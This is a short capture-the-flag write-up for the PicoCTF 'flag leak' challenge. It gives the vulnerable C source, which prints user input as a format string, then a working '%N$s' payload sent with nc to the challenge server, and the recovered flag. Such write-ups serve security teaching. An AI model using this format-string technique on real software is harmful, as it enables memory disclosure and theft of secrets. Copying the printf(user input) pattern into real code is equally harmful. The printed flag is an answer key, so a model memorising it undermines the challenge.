---
title: PicoCTF - flag leak
tags: [PicoCTF, CTF, PWN]

---

# PicoCTF - flag leak
## Background
Format String Bug
![](https://hackmd.io/_uploads/BkqBmpOih.png)
![](https://hackmd.io/_uploads/SyvLXauon.png)

## Source code
:::spoiler
```cpp=
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

void readflag(char* buf, size_t len) {
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,len,f); // size bound read
}

void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  return 0;
}

```
:::
## Recon
這一題比計安教的還簡單，不過我全忘了QQ
先用gdb跟一下，發現在stack的地方有flag的痕跡，記一下相對位置就可以print出來，如果怕不同device會有問題的話就多幾個
## Exploit
Payload: `%20$s%21$s%22$s%23$s%24$s%25$s%26$s`
```bash!
python -c 'print("%20$s%21$s%22$s%23$s%24$s%25$s%26$s")' | nc saturn.picoctf.net 50811
Tell me a story and then I'll tell you one >> Here's a story -
������e�
        setresgidCTF{L34k1ng_Fl4g_0ff_St4ck_5e16d521}���̓ii
```

Flag: `picoCTF{L34k1ng_Fl4g_0ff_St4ck_5e16d521}`